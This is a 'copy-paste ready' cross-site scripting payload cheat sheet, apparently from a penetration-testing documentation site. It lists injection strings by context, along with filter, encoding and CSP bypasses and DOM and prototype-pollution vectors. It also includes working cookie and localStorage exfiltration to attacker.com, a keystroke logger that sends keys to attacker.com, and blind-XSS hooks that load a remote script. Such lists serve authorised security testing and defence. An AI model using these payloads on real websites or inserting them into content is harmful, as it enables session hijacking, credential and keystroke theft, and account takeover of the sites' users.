# XSS Payloads

Quick reference by context. Copy-paste ready.

## Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## Inside Attribute (Quoted)

```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)
'-alert(1)-'
" autofocus onfocus=alert(1) x="
```

## Inside Attribute (Unquoted)

```html
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
 onclick=alert(1)//
```

## Inside JavaScript String

```javascript
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
';alert(1)//
"-alert(1)-"
\"-alert(1)//
";alert(1)//
```

## Template Literals (Backticks)

```javascript
${alert(1)}
`${alert(1)}`
${`${alert(1)}`}
```

## Inside href/src

```html
javascript:alert(1)
javascript://anything%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## SVG Context

```html
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1)>
<svg><a><rect width=99% height=99%></a><animate attributeName=href to=javascript:alert(1)>
```

## Without Parentheses

```javascript
alert`1`
[].constructor.constructor('alert(1)')()
location='javascript:alert(1)'
setTimeout`alert\x281\x29`
onerror=alert;throw 1
{onerror=alert}throw 1
```

## Without Spaces

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<input/onfocus=alert(1)/autofocus>
```

## Without Slashes

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

## Without alert/prompt/confirm

```javascript
eval(atob('YWxlcnQoMSk='))
[].constructor.constructor('ale'+'rt(1)')()
window['al'+'ert'](1)
top['al'+'ert'](1)
this['al'+'ert'](1)
```

## Case Bypass

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<iMg sRc=x oNeRrOr=alert(1)>
```

## Encoding

```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E
%3Csvg%20onload%3Dalert(1)%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode escape -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Hex -->
<script>\x61lert(1)</script>

<!-- Octal -->
<script>\141lert(1)</script>
```

## DOM XSS Payloads

```
# location.hash
https://target.com/#<img src=x onerror=alert(1)>

# location.search
https://target.com/?q=<script>alert(1)</script>

# window.name (cross-origin)
window.name='<img src=x onerror=alert(document.domain)>';location='https://target.com'

# postMessage
targetWindow.postMessage('<img src=x onerror=alert(1)>','*')
```

## Prototype Pollution → XSS

```
# URL pollution
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=https://attacker.com/evil.js

# postMessage pollution
postMessage('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}','*')
```

## CSP Bypass Payloads

```html
<!-- If 'unsafe-inline' -->
<script>alert(1)</script>

<!-- If data: allowed -->
<script src="data:text/javascript,alert(1)"></script>

<!-- Missing object-src -->
<object data="javascript:alert(1)">

<!-- Missing base-uri -->
<base href="https://attacker.com/">

<!-- JSONP on allowed domain -->
<script src="https://allowed.com/api?callback=alert(1)//"></script>

<!-- AngularJS on CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## Exfiltration (Cookie Theft)

```javascript
// Basic
fetch('https://attacker.com/?c='+document.cookie)

// Image beacon
new Image().src='https://attacker.com/?c='+document.cookie

// With localStorage
fetch('https://attacker.com/log',{method:'POST',body:JSON.stringify({c:document.cookie,l:localStorage})})

// DNS exfil (CSP bypass)
new Image().src='https://'+btoa(document.cookie).replace(/=/g,'')+'.attacker.com/x'
```

## Keylogger

```javascript
document.onkeypress=e=>fetch('https://attacker.com/?k='+e.key)
```

## Blind XSS Payloads

```html
<script src="https://attacker.com/hook.js"></script>
<img src=x onerror="s=document.createElement('script');s.src='https://attacker.com/hook.js';document.body.appendChild(s)">
"><script src=https://attacker.com/hook.js></script>
```

---

!!! tip "Context Matters"
    Always identify the injection context first, then choose appropriate payload.

---
*See full [XSS methodology](../vulns/xss/index.md) for detection and escalation.*
